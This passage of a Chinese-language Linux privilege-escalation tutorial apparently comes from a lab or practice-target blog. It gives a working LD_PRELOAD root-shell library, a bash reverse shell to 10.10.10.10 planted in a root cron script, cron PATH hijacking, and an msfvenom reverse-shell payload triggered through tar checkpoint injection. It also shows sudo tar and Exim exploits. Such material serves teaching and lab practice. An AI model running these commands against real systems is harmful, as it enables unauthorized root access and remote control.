+<p>就能 <strong>注入 .so 劫持函数</strong>，无需找参数逃逸，直接拿 root：</p>
+</blockquote>
+<p>先写<code>shell.c</code></p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/d0f1445140d60931c83b7a94b60fefdd.png" alt="image-20251126201448446"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<blockquote>
+<p>[!CAUTION]</p>
+<p><strong>SUID共享库也有另一种写法，对比一下</strong></p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">void _init() &#123;</span><br><span class="line">    unsetenv(&quot;LD_PRELOAD&quot;);</span><br><span class="line">    setgid(0);</span><br><span class="line">    setuid(0);</span><br><span class="line">    system(&quot;/bin/bash&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+<table>
+<thead>
+<tr>
+<th>代码</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>#include ...</code></td>
+<td>引入标准头，后面要用<code>setuid/setgid/system</code></td>
+</tr>
+<tr>
+<td><code>void _init()</code></td>
+<td><strong>共享库构造函数</strong>；当库被<strong>ld.so 装载</strong>时，<strong>立即执行一次</strong>（无需显式调用）。</td>
+</tr>
+<tr>
+<td><code>unsetenv(&quot;LD_PRELOAD&quot;)</code></td>
+<td>把自己从环境变量里抹去，防止**system(“&#x2F;bin&#x2F;bash”)**再次加载自己而无限递归。</td>
+</tr>
+<tr>
+<td><code>setgid(0); setuid(0);</code></td>
+<td>把当前进程<strong>有效 UID&#x2F;GID 硬设为 0</strong>（root）。 前提：调用者必须是 root 或具有<code>CAP_SETUID</code>；在<strong>sudo 上下文</strong>里满足。</td>
+</tr>
+<tr>
+<td><code>system(&quot;/bin/bash&quot;);</code></td>
+<td>启动交互 bash，<strong>继承已提升的 root 身份</strong>。</td>
+</tr>
+</tbody></table>
+<p>然后进行<strong>编译</strong>，因为是以共享库的形式实用的，所有我们要按照共享库的编译语法进行编译</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -fPIC -shared -o shell.so shell.c -nostartfile</span><br></pre></td></tr></table></figure>
+
+
+<table>
+<thead>
+<tr>
+<th>片段</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>gcc</code></td>
+<td>调用 GCC</td>
+</tr>
+<tr>
+<td><code>-fPIC</code></td>
+<td><strong>位置无关代码</strong>（Position Independent Code），<strong>.so 必加</strong>，否则重定位失败。</td>
+</tr>
+<tr>
+<td><code>-shared</code></td>
+<td><strong>生成共享库</strong>（.so），不是可执行程序。</td>
+</tr>
+<tr>
+<td><code>-o shell.so</code></td>
+<td>输出文件名。</td>
+</tr>
+<tr>
+<td><code>shell.c</code></td>
+<td>源文件（里面只有<code>_init</code>或函数，无<code>main</code>）。</td>
+</tr>
+<tr>
+<td><code>-nostartfiles</code></td>
+<td><strong>不把 crt1.o、crti.o 等启动文件链接进来</strong>→ 体积更小，<strong>也避免“找不到 _start” 报错</strong>（因为我们根本没有 main）。</td>
+</tr>
+</tbody></table>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/553b77401ca2207f1ca28338ba42cc8e.png" alt="image-20251126202459819"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p>编译成功</p>
+<p>下面这个语句集中提现提权的逻辑，具体操作是在这个共享库中完成的</p>
+<p>因为可以<code>sudo find</code>在<code>find</code>之前预加载了这个<code>LD_PRELOAD</code>，而<code>LD_PRELOAD</code>里面有提权逻辑</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo LD_PRELOAD=/home/user/shell.so find</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i-blog.csdnimg.cn/img_convert/4d270b448f747a40f5f0db2f3e7b1edc.png" alt="image-20251126203520463"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<h3 id="提权逻辑"><a href="#提权逻辑" class="headerlink" title="提权逻辑"></a>提权逻辑</h3><p>① <strong>sudo 创建 euid&#x3D;0 的进程</strong> ② <strong>ld.so 先加载 <code>/home/user/shell.so</code></strong>（root 身份） ③ <strong><code>.so</code> 里的 <code>_init()</code> 执行</strong>：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setuid(0); setgid(0); system(&quot;/bin/bash&quot;);</span><br></pre></td></tr></table></figure>
+
+<p>④ <strong>新 bash 继承 uid&#x3D;0</strong> → <strong>直接拿到 root shell</strong></p>
+<h3 id="什么是共享库"><a href="#什么是共享库" class="headerlink" title="什么是共享库"></a>什么是共享库</h3><p>点击展开&#x2F;收缩</p>
+<h2 id="自动任务-3讲"><a href="#自动任务-3讲" class="headerlink" title="自动任务 3讲"></a>自动任务 3讲</h2><ul>
+<li><code>crontab</code></li>
+<li><code>/etc/cron.hourly/</code>、<code>/etc/cron.daily/</code> … 这些目录里有没有<strong>可写的脚本</strong>；</li>
+<li><code>/etc/cron.d/</code> 下有没有<strong>自定义文件</strong>；</li>
+<li>普通用户自己的 <code>crontab -l</code>；</li>
+<li>或者 systemd timer 等新型定时机制。</li>
+</ul>
+<h3 id="1，自动任务文件权限提权"><a href="#1，自动任务文件权限提权" class="headerlink" title="1，自动任务文件权限提权"></a>1，自动任务文件权限提权</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/crontab</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i-blog.csdnimg.cn/img_convert/71657fa582cdf93ce51a91b8a61da3a0.png" alt="image-20251126204336748"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p>这里有以root权限执行两个sh脚本</p>
+<p>先看一下文件所在位置 <code>locate overwrite.sh</code> ，并且发现具有该文件的可写权限</p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/9ffd7e3ac59256fb2837357f20ce9fe1.png" alt="image-20251126204734971"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p>看一下文件内容：把日期写到 <code>/tmp/useless</code>目录下</p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/117eeae3e4448d75670e6d583c1e5213.png" alt="image-20251126204825171"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p>因为该定时任务是以root身份执行，并且可写，那我们可以构造反弹shell</p>
+<p>kali中设置监听 <code>nc -lvnp 4444</code></p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/cbd4611e08423779f9852f3372e10c68.png" alt="image-20251126205042840"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p>靶机中直接vi修改定时任务文件的内容</p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/f54e3d0b50b284944b10ca69dc66ac77.png" alt="image-20251126205639701"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash -i &gt;&amp; /dev/tcp/10.10.10.10/4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i-blog.csdnimg.cn/img_convert/067f05aca365c1cfa915ed6673f80856.png" alt="image-20251126205204874"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<table>
+<thead>
+<tr>
+<th>片段</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>#!/bin/bash</code></td>
+<td>告诉系统用 bash 解释执行</td>
+</tr>
+<tr>
+<td><code>bash -i</code></td>
+<td>启动<strong>交互式</strong>（interactive）bash，支持补全、历史等</td>
+</tr>
+<tr>
+<td><code>&gt;&amp; /dev/tcp/10.10.10.10/4444</code></td>
+<td>Bash 内置特性：把<strong>标准输出（1）<strong>重定向到</strong>TCP 连接</strong>（攻击机 IP 端口）</td>
+</tr>
+<tr>
+<td><code>0&gt;&amp;1</code></td>
+<td>把<strong>标准输入（0）<strong>重定向到</strong>标准输出（1）</strong>，也就是同一个 TCP 连接</td>
+</tr>
+<tr>
+<td><strong>隐含 2&gt;&amp;1</strong></td>
+<td>标准错误（2）也会跟随 1，一起进 TCP，实现<strong>输入&#x2F;输出&#x2F;错误</strong>全套转发</td>
+</tr>
+</tbody></table>
+<p>保存完退出，此时等上一段时间，kali就会收到反弹shell</p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/225a9124a355392153bad3c094574eeb.png" alt="image-20251126205833740"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<h3 id="2，自动任务PATH环境变量提权"><a href="#2，自动任务PATH环境变量提权" class="headerlink" title="2，自动任务PATH环境变量提权"></a>2，自动任务PATH环境变量提权</h3><p>除了我们上面的第一种的可写自动任务提权，这里还可以用到PATH环境变量提权</p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/c3977cb98aaac71df0906efc4d7b4025.png" alt="image-20251126211337353"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p>看到<strong>红框</strong>内说明crontab有shell的指定 <code>/bin/bash</code>； 也有 PATH路径变量的指定</p>
+<p>并且在以<code>:</code>分割的路径集中，<strong>黄线</strong>标识了有<code>/home/user</code>排在最前面，优先于<strong>蓝线</strong><code>overwrite.sh</code>的绝对路径</p>
+<p>而当前用户就是 user <strong>黄线</strong> 。在路径集中排前的会优先执行，</p>
+<p>并且定时任务<strong>绿线</strong><code>overwrite.sh</code>的路径只是文件名，不像他的下面一个自动任务是<code>绝对路径</code></p>
+<p>所以我们完全可以在本地自己写一个反弹shell的脚本改名为<code>overwrite.sh</code>，系统执行自动任务时优先以<code>PATH /home/user</code>里的<code>overwrite.sh</code>执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vim overwrite.sh</span><br><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">cp /bin/bash /tmp/rootbash</span><br><span class="line">chmod +xs /tmp/rootbash</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i-blog.csdnimg.cn/img_convert/cd78edb3bdd48c2cfc28fb2a82b7fd5e.png" alt="image-20251126214222546"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/294c957332aad6e56e3d4713002c21d5.png" alt="image-20251126214343412"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p>实现前提:<code>crontab</code>中，路径PATH的头部有当前的家目录，这样在执行过程中会先执行排前的 目录 中的文件，而不是去找排在后面的<code>overwrite.sh</code></p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/3380cd156955e9a4634e670e3485f8c3.png" alt="image-20251126214704941"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p>获得root权限</p>
+<blockquote>
+<p>-p 强制 bash 以 真实 UID&#x3D;0 的身份启动，不降级 ，也不加载普通用户的 env 文件；常配合 SUID&#x2F;被夺 root-shell 用，防止掉权。</p>
+</blockquote>
+<h3 id="3，自动任务通配符-‘-‘-提权"><a href="#3，自动任务通配符-‘-‘-提权" class="headerlink" title="3，自动任务通配符 ‘*‘ 提权"></a>3，自动任务通配符 ‘*‘ 提权</h3><p><img src="https://i-blog.csdnimg.cn/img_convert/28a757805cbeaf66624bb39ea4ac71fd.png" alt="image-20251126215004842"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p>overwrite.sh的提权方式两种都完了</p>
+<p>下面的 <code>/usr/local/bin/compress.sh</code>的提权利用如下</p>
+<table>
+<thead>
+<tr>
+<th><code>tar czf /tmp/backup.tar.gz *</code></th>
+<th>将当前目录下的所有文件和文件夹打包并压缩为<code>/tmp/backup.tar.gz</code></th>
+</tr>
+</thead>
+</table>
+<ul>
+<li><code>tar</code>：Linux 下的归档工具</li>
+<li><code>c</code>：创建新的归档文件</li>
+<li><code>z</code>：使用 gzip 压缩</li>
+<li><code>f</code>：指定归档文件名</li>
+<li><code>*</code>：匹配当前目录下的所有文件和文件夹</li>
+<li>这里的<code>/home/user</code>就是初始用户的家目录</li>
+</ul>
+<p>这是贴合实际的，管理员会经常对重要目录下的文件进行备份</p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/82bac5f93775b0531a93263c17dfc265.png" alt="image-20251126215609278"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p>我们可以根据<strong>tar</strong>的这个点提权</p>
+<p><strong>kali</strong></p>
+<p>先构造一个二进制文件的反弹shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo msfvenom-p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i-blog.csdnimg.cn/img_convert/8a109d17843dfc5b086e4621391a7f6c.png" alt="image-20251126215801559"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p>然后架设web服务器 <code>sudo php -S 0:80</code></p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/aa6adc4dcffde068d0cd88e71bfcddd0.png" alt="image-20251126215955595"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p>靶机中，<code>wget</code>把<code>shell.elf</code>下载下来</p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/969edd8f40e92eb3d1c5f3aa07041af3.png" alt="image-20251126220133047"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p>给他权限 <code>chmod +xs shell.elf</code></p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/613ba1973bd54711abbac69eb6b34ed5.png" alt="image-20251126220221181"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p>kali中开启监听 <code>sudo -lvnp 4444</code></p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/be053e3a5ad0515cad17a00ba93f7dc0.png" alt="image-20251126220505326"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p>因为需要用到tar的检查点进行提权，要建几个文件（user目录下）</p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/66559e2878d84213ccf89804e18ad06f.png" alt="image-20251126220527354"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<table>
+<thead>
+<tr>
+<th><code>--checkpoint=1</code></th>
+<th><strong>每处理 1 个文件就触发一次检查点</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>--checkpoint-action=exec=xxx</code></td>
+<td><strong>到达检查点时执行操作</strong></td>
+</tr>
+</tbody></table>
+<p>等待自动任务执行即可</p>
+<p>在自行自动任务时，会打包当前路径下的文件，在检测点时会执行我们的<code>shell.elf</code></p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/0d641d44d1b444c57da010dd1540f698.png" alt="image-20251126221042217"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<blockquote>
+<h3 id="tar-的-Checkpoint-机制"><a href="#tar-的-Checkpoint-机制" class="headerlink" title="tar 的 Checkpoint 机制"></a>tar 的 Checkpoint 机制</h3><ul>
+<li><strong>–checkpoint</strong> 每 N 个文件打印一次进度</li>
+<li><strong>–checkpoint-action&#x3D;ACTION</strong> 到达检查点时执行 ACTION ACTION 可以是：</li>
+<li><code>exec=command</code><strong>直接 fork+exec 命令</strong>（root 身份）</li>
+<li><code>echo=string</code> 打印字符串（无代码执行）</li>
+</ul>
+<h3 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h3><h4 id="①-sudo-白名单"><a href="#①-sudo-白名单" class="headerlink" title="① sudo 白名单"></a>① sudo 白名单</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user ALL=(root) NOPASSWD: /bin/tar</span><br></pre></td></tr></table></figure>
+
+<p>→ 普通用户可 <strong>以 root 身份跑 tar</strong>。</p>
+<h4 id="②-cron-root-定时备份脚本"><a href="#②-cron-root-定时备份脚本" class="headerlink" title="② cron&#x2F;root 定时备份脚本"></a>② cron&#x2F;root 定时备份脚本</h4><p>1.如本次提权</p>
+<p>2.如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">cd /home &amp;&amp; tar czf /tmp/backup.tar.gz --checkpoint=1 --checkpoint-action=exec=/bin/bash user</span><br></pre></td></tr></table></figure>
+
+<p>→ 攻击者 <strong>写入家目录文件</strong>即可触发。</p>
+</blockquote>
+<h3 id="tar的sudo白名单提权上下"><a href="#tar的sudo白名单提权上下" class="headerlink" title="tar的sudo白名单提权上下"></a>tar的sudo白名单提权上下</h3><p>sudo 白名单</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user ALL=(root) NOPASSWD: /bin/tar</span><br></pre></td></tr></table></figure>
+
+<p>→ 普通用户可 <strong>以 root 身份跑 tar</strong>。</p>
+<blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo tar czf /tmp/bak.tar.gz \</span><br><span class="line">          --checkpoint=1 \</span><br><span class="line">          --checkpoint-action=exec=/bin/bash \</span><br><span class="line">          /tmp/evil</span><br></pre></td></tr></table></figure>
+
+<p>t0 sudo 启动 tar，euid&#x3D;0 t1 tar 扫描 &#x2F;tmp&#x2F;evil，发现 1 个文件 t2 触发 checkpoint → fork() t3 子进程 execve(“&#x2F;bin&#x2F;bash”, …) ← 此时 uid&#x2F;gid&#x3D;0 t4 你拿到 # 提示符，id 显示 uid&#x3D;0(root) t5 退出 bash 后 tar 继续打包，正常结束</p>
+<p>上面的反斜线\是用来分割命令的，具体直接写下面的就行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo tar czf /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash /etc/hostname</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p><code>/etc/hostname</code> 只有 1 行，也足够触发 checkpoint&#x3D;1。</p>
+</blockquote>
+</blockquote>
+<h2 id="SUID提权-5讲"><a href="#SUID提权-5讲" class="headerlink" title="SUID提权 5讲"></a>SUID提权 5讲</h2><p>对于<strong>可执行文件位</strong>的搜索</p>
+<p><code>find / -perm -u=s -type f 2&gt;/dev/null</code>：查找 SUID 文件。查看有S位的可执行文件</p>
+<table>
+<thead>
+<tr>
+<th>片段</th>
+<th>作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>find</code></td>
+<td>查找文件</td>
+</tr>
+<tr>
+<td><code>/</code></td>
+<td>从根目录开始递归搜整个文件系统</td>
+</tr>
+<tr>
+<td><code>-perm -u=s</code></td>
+<td>匹配<strong>用户位</strong>设置了<strong>SUID</strong>的文件（<code>-</code>表示“至少”该位）</td>
+</tr>
+<tr>
+<td><code>-type f</code></td>
+<td>只列出普通文件，排除目录、链接等</td>
+</tr>
+<tr>
+<td><code>2&gt;/dev/null</code></td>
+<td>把“权限拒绝”等错误信息扔进黑洞，屏幕只保留结果</td>
+</tr>
+<tr>
+<td><code>-perm -u=s</code></td>
+<td>用户位<strong>含 SUID</strong></td>
+</tr>
+<tr>
+<td><code>-perm -g=s</code></td>
+<td>组位<strong>含 SGID</strong></td>
+</tr>
+</tbody></table>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/7db5e3f32ff92b65fe429df4ad41aecb.png" alt="image-20251127183643279"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p>执行这些文件，将以<strong>文件属主的权限执行</strong>，获得提权的路径。<strong>比如下面有SUID的可执行程序属主就是root</strong></p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/fe844a880249650750943d673ddeb944.png" alt="image-20251127194224404"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<blockquote>
+<p>[!IMPORTANT]</p>
+<p><strong>判断如何利用：</strong></p>
+<p><strong>1.直接执行，查看交互结果</strong></p>
+<p><strong>2.strings查看可读字符串</strong></p>
+<p><strong>3.strace看他和系统内核之间有哪些交互</strong></p>
+</blockquote>
+<h3 id="1-SUID可执行文件已知利用提权"><a href="#1-SUID可执行文件已知利用提权" class="headerlink" title="1.SUID可执行文件已知利用提权"></a>1.SUID可执行文件已知利用提权</h3><blockquote>
+<p>[!CAUTION]</p>
+<p><strong>很多工具具有s位，如何利用，去找已知的公开利用文件</strong></p>
+<p><strong>下面只做其中的一个演示</strong></p>
+</blockquote>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/e986406a4804037b03b5978f8abd5762.png" alt="image-20251127185433709"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p><strong><code>exim-4.84-3</code>的利用</strong></p>
+<blockquote>
+<p>[!IMPORTANT]</p>
+<p>Exim 提权的核心：<strong>“邮件服务器常以 root 身份运行，默认&#x2F;配置失误后，普通用户可投递恶意邮件或在命令行里插入任意选项 → 触发高危功能 → 拿到 root shell”</strong>。</p>
+<p><strong>漏洞版本</strong>：≤ 4.94 均可。</p>
+<p><strong>Exim 常以 root 跑，配置或代码里 <code>${run{}}</code>、<code>-be</code>、<code>-bnex</code> 等选项没降权，就能把命令插进去执行；本地一条 <code>exim -be &#39;${run{/bin/bash}}&#39;</code> 就能提权，远程则往邮件头里扔 <code>${run{}}</code> 一样秒 root，升级版本或禁用字符串扩展即可防。</strong></p>
+</blockquote>
+<p><code>searchsploit exim</code> 找到这        <code>ivilege Escalation即：本地提权</code>的<code>39535.sh</code>文件下载下来</p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/5e3234d6b0a43d03467f1716df314178.png" alt="image-20251127183809401"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/ae90c734062cc4c0382f974c4cb231a0.png" alt="image-20251127184122015"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p><img src="https://i-blog.csdnimg.cn/direct/3b49c5e079334c5a9789978904b472e2.png"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p>kali开启服务器 <code>sudo php -S 0:80</code> 靶机下载 : <code>wget</code></p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/f67a41971c920ec4ccbfc589751a79d8.png" alt="image-20251127184623445"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p><code>chmod +x 39535.sh</code>给他执行权限</p>
+<p><code>./39535.sh</code>执行，即可获得root权限</p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/8cfb744ea1912922a0f10f43976f2bab.png" alt="image-20251127184802563"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<h3 id="2-SUID共享库注入提权"><a href="#2-SUID共享库注入提权" class="headerlink" title="2.SUID共享库注入提权"></a>2.SUID共享库注入提权</h3><blockquote>
+<p>[!NOTE]</p>
+<p>在打靶过程中，只要有s位的可执行文件，没见过：可以执行一下试试；也可以直接搜利用</p>
+</blockquote>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/215ab9369b6ea1ceb1e687cdfd30f080.png" alt="image-20251127185512284"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<blockquote>
+<p>[!NOTE]</p>
+<p><strong>Linux中的so指代什么内容？</strong></p>
+<h3 id="Shared-Object（共享库）-★★★-最常见-99"><a href="#Shared-Object（共享库）-★★★-最常见-99" class="headerlink" title="Shared Object（共享库） ★★★ 最常见 99%"></a><strong>Shared Object（共享库）</strong> ★★★ 最常见 99%</h3><ul>
+<li><strong>文件后缀</strong>：<code>.so</code>（如 <code>libc.so.6</code>）</li>
+<li><strong>本质</strong>：ELF 格式的 <strong>动态链接库</strong>，代码只加载一次，<strong>多进程共享</strong>，节省内存&#x2F;磁盘。</li>
+<li></li>
+</ul>
+</blockquote>
+<p>这里我们先执行了一下看看是干什么的程序。。。看不出来</p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/a4b37a98db2f0f7fd5bf4ef265c34059.png" alt="image-20251127185549785"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p>用 <code>strings</code>读取执行过程中的<strong>可读字符串</strong>，里面也涉及 <code>.so</code>格式</p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/64a01191223479956d3afb60d333719d.png" alt="image-20251127185857457"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
+<p>用<code>strace</code>追踪该文件</p>
+<p><img src="https://i-blog.csdnimg.cn/img_convert/eabf05bc1c943dfb720e6ff0a292fdc6.png" alt="image-20251127190610224"></p>
+<p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==" title="点击并拖拽以移动">编辑</p>
